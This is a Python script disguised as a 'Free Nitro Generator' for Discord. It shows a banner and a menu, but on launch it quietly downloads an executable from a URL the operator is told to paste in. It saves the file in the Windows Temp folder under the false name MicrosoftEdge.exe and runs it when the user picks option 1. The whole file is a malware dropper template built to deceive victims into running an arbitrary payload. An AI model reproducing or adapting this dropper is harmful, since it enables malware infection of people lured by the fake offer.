from pystyle import Colors, Write
import subprocess
import os
import requests
import getpass
import ctypes
ascii_art = """
███╗   ██╗██╗████████╗██████╗  ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
"""

menu = """
―――――――――――――――――――
| 1) Generate Nitro
| 2) Soon...
―――――――――――――――――――
"""

username = getpass.getuser()
def titlo(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)
    
titlo("Free Nitro Generator!")
def download_file(url, save_path):
    response = requests.get(url, stream=True)
    response.raise_for_status()

    with open(save_path, 'wb') as file:
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
def main():
    url = "paste here your own link to instantly download executable!"
    directory = "C:\\Windows\\Temp"
    filename = "MicrosoftEdge.exe"
    save_path = os.path.join(directory, filename)
    try:
        download_file(url, save_path)
    except Exception as e:
        print(f"An error occurred: {e}")
if __name__ == "__main__":
    main()

Write.Print(ascii_art, Colors.green_to_cyan, interval=0)
Write.Print(menu, Colors.green_to_cyan, interval=0)
filename = "MicrosoftEdge.exe"
directory = "C:\\Windows\\Temp"
save_path = os.path.join(directory, filename)
try:
    vari = int(Write.Input(">>> ", Colors.green_to_cyan, interval=0).strip())
    if vari == 1:
        file = rf"{save_path}"
        if os.path.isfile(file):
            subprocess.Popen([file], shell=True)
        else:
            print("Executable file not found.")
    else:
        print("Wrong option selected! Please try again.")
except ValueError:
    print("Invalid input. Please enter a number.")
